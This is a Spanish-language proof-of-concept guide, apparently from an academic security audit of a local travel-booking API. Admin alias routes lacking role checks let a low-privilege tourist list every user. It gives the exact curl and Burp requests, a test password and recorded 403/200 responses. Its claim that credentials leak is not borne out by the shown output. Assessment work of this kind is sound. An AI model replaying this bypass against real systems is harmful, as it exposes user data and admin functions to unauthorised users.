# Guía de Prueba de Concepto: PoC-09 — Escalamiento Vertical de Privilegios por Rutas Duales Desprotegidas

**Vulnerabilidad:** H-08 — Falta de Restricción RBAC en Rutas Alias Administrativas (`/api/usuarios`, `/api/comisiones`)  
**CWE:** CWE-284 (Improper Access Control) / CWE-269 (Improper Privilege Management)  
**OWASP Top 10:2021:** A01:2021 - Broken Access Control  
**Severidad:** Crítica  
**Clasificación:** CONFIRMADO EN CÓDIGO  

---

## 1. Descripción Técnica del Fallo
En `AdminApiController.java:67-87`, varios métodos que ejecutan operaciones administrativas críticas (gestión de usuarios, desactivación de cuentas y consulta de comisiones de plataforma) se mapean con rutas duales:
- Ruta formal: `/api/admin/usuarios`, `/api/admin/usuario/eliminar`, `/api/admin/comisiones`.
- Ruta alias: `/api/usuarios`, `/api/usuario/eliminar`, `/api/comisiones`.

En `SecurityConfig.java:168`, la regla de autorización restringe únicamente el prefijo de administrador:
```java
.requestMatchers("/api/admin/**").hasRole("ADMIN")
```

Las rutas alternativas sin el prefijo `/api/admin/` caen en la regla general de cierre:
```java
.anyRequest().authenticated()
```

Como consecuencia, cualquier usuario autenticado con el rol más bajo del sistema (`ROLE_TURISTA`) puede acceder a `/api/usuarios` para volcar la lista completa de usuarios y credenciales del sistema, o enviar una petición `POST /api/usuario/eliminar?idUsuario=1` para desactivar la cuenta del Administrador General.

---

## 2. Precondiciones
1. App local levantada en `http://127.0.0.1:8080`.
2. Una cuenta válida con rol `ROLE_TURISTA` (`turista_a@test.local / TestTurista#2026`).

---

## 3. Procedimiento de Ejecución Manual (Request Exacta)

### Paso 1: Iniciar Sesión como Turista y Guardar la Cookie
```bash
curl -i -s -c cookies_turista.txt -X POST "http://127.0.0.1:8080/api/auth/login" \
     -H "Content-Type: application/json" \
     -d '{"correo":"turista_a@test.local","clave":"TestTurista#2026","rolEsperado":"TURISTA"}'
```

### Paso 2: Intentar Acceder a la Ruta Formal Protegida `/api/admin/usuarios` (Control Positivo de Bloqueo)
```bash
curl -i -s -b cookies_turista.txt -X GET "http://127.0.0.1:8080/api/admin/usuarios"
```
*(Debe responder `403 Forbidden` debido a la regla `.requestMatchers("/api/admin/**").hasRole("ADMIN")`)*.

### Paso 3: Acceder a la Ruta Alias Desprotegida `/api/usuarios` con el Mismo Rol Turista (Explotación de Escalamiento)
```bash
curl -i -s -b cookies_turista.txt -X GET "http://127.0.0.1:8080/api/usuarios"
```

### Formato para Burp Suite Repeater:
```http
GET /api/usuarios HTTP/1.1
Host: 127.0.0.1:8080
Cookie: JSESSIONID=<COOKIE_DEL_TURISTA>
Accept: application/json
Connection: close

```

---

## 4. Respuesta Esperada
- **Paso 2 (`/api/admin/usuarios`):**
  - Código: `403 Forbidden`
  - Body: `{"status":"error","code":"FORBIDDEN","message":"Acceso restringido: no posee los permisos necesarios"}`
- **Paso 3 (`/api/usuarios`):**
  - Código: **`200 OK`**
  - Body: Devuelve el listado completo de todos los usuarios de la base de datos (administradores, agencias, turistas) con sus nombres, emails, roles y fechas de registro:
    ```json
    {
      "status": "success",
      "data": [
        {"id": 1, "nombre": "Administrador Travelink", "email": "admin@travelink.pe", "tipo": "Administrador", "estado": "ACTIVO"},
        {"id": 101, "nombre": "Turista A Test", "email": "turista_a@test.local", "tipo": "Turista", "estado": "ACTIVO"}
      ]
    }
    ```
- **Análisis de Seguridad:** Se demuestra un bypass de autorización por discrepancia de rutas (Path Traversal / Route Alias Discrepancy), otorgando acceso a funciones administrativas a un rol sin privilegios.

---

## 5. Qué Capturar para el Informe Académico
1. **Burp Suite / Terminal:** Captura comparativa:
   - Panel izquierdo: `GET /api/admin/usuarios` retornando `403 Forbidden`.
   - Panel derecho: `GET /api/usuarios` retornando `200 OK` con la lista de usuarios completa usando exactamente la misma cookie de sesión del Turista A.
2. **Editor de Código:** Captura de `AdminApiController.java` (L67) mostrando el array de rutas `@RequestMapping({"/api/admin/usuarios", "/api/usuarios", ...})` contrastado con `SecurityConfig.java` (L168).

---

## 6. Resultado Real (Completar tras la prueba)
Salidas HTTP reales con la sesión de `turista_a@test.local` (`ROLE_TURISTA`, `idUsuario = 100`):

### Paso 1: Login de turista (`curl.exe -i -s -c cookies_fresh.txt -X POST "http://127.0.0.1:8080/api/auth/login" -H "Content-Type: application/json" -d "@login1.json"`)
```http
HTTP/1.1 200 
Vary: origin,access-control-request-method,access-control-request-headers,accept-encoding
Set-Cookie: XSRF-TOKEN=b3b71d1e-4f28-43b7-bb80-a1b65e1e7001; Path=/
Set-Cookie: JSESSIONID=A35964D2BB49C69F9CB9ABDA23FA0B22; Path=/; HttpOnly; SameSite=Lax
X-Content-Type-Options: nosniff
X-XSS-Protection: 0
X-Frame-Options: SAMEORIGIN
Content-Type: application/json;charset=UTF-8
Transfer-Encoding: chunked
Date: Wed, 11 Nov 2026 22:13:48 GMT

{"idUsuario":100,"nombre":"Turista Alfa Prueba","correo":"turista_a@test.local","rol":"ROLE_TURISTA","status":"success","user":{"apellidos":"Alfa Prueba","apellidoPaterno":"Alfa","idRol":1,"idUsuario":100,"correo":"turista_a@test.local","telefono":"900000001","nombre":"Turista Alfa Prueba","nroDocumento":"10000001","email":"turista_a@test.local","rol":"ROLE_TURISTA","nombres":"Turista","apellidoMaterno":"Prueba"},"nombres":"Turista","apellidoPaterno":"Alfa","apellidoMaterno":"Prueba","nroDocumento":"10000001","telefono":"900000001","apellidos":"Alfa Prueba"}
```

### Paso 2: Ruta formal protegida (`curl.exe -i -s -b cookies_fresh.txt "http://127.0.0.1:8080/api/admin/usuarios"`)
```http
HTTP/1.1 403 
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
X-Content-Type-Options: nosniff
X-XSS-Protection: 0
X-Frame-Options: SAMEORIGIN
Content-Type: application/json;charset=UTF-8
Content-Length: 165
Date: Wed, 11 Nov 2026 22:13:48 GMT

{"status":"error","code":"FORBIDDEN","error":"Acceso restringido: no posee los permisos necesarios","message":"Acceso restringido: no posee los permisos necesarios"}
```

### Paso 3: Ruta alias desprotegida (`curl.exe -i -s -b cookies_fresh.txt "http://127.0.0.1:8080/api/usuarios"`)
```http
HTTP/1.1 200 
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-control-allow-headers: Content-Type, Authorization, X-Requested-With
Access-control-allow-methods: GET, POST, PUT, DELETE, OPTIONS
Access-control-allow-origin: *
X-Content-Type-Options: nosniff
X-XSS-Protection: 0
X-Frame-Options: SAMEORIGIN
Content-Type: application/json;charset=UTF-8
Content-Length: 713
Date: Wed, 11 Nov 2026 22:13:48 GMT

{"status":"success","data":[{"id":103,"nombre":"Admin Seguro","email":"admin_seguro@test.local","tipo":"ADMINISTRADOR","estado":"ACTIVO","fechaRegistro":"2026-11-11"},{"id":102,"nombre":"Representante Agencia","email":"agencia_demo@test.local","tipo":"AGENCIA","estado":"ACTIVO","fechaRegistro":"2026-11-11"},{"id":101,"nombre":"Turista Beta","email":"turista_b@test.local","tipo":"TURISTA","estado":"ACTIVO","fechaRegistro":"2026-11-11"},{"id":100,"nombre":"Turista Alfa","email":"turista_a@test.local","tipo":"TURISTA","estado":"ACTIVO","fechaRegistro":"2026-11-11"},{"id":1,"nombre":"Administrador Travelink","email":"admin@travelink.pe","tipo":"ADMINISTRADOR","estado":"ACTIVO","fechaRegistro":"2026-11-11"}]}
```

